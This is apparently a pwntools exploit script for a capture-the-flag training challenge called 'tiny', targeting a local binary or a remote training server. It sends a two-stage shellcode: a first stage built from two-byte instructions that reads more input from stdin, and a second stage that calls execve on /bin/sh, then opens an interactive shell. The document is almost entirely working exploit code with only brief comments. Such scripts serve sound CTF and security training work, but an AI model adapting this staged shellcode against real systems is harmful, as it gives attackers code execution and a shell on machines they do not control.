from pwn import *

COMMANDS = """
b *0x00000000004019a2
b *0x0000000000401b9e
c
si

"""

context.arch = "amd64" 

if args.REMOTE:
    c = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./tiny" , gdbscript=COMMANDS)
    else:
        c = process("./tiny")

input("Waiting for code:")

#first stage shellcode to perform a read from stdin: this is made of instructions of up to 2 bytes to satisfy the constraint
c.send(b"\x31\xC0\x31\xFF\x54\x5E\x31\xD2\x6A\x64\x5A\x0F\x05\xFF\xE6")

c.recvuntil(b"Good luck!!!")

#second stage shellcode: this is a classic execve syscall
c.send(b"\x48\x89\xF7\x48\x83\xC7\x17\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x31\xD2\x31\xF6\x0F\x05/bin/sh\0")

c.interactive()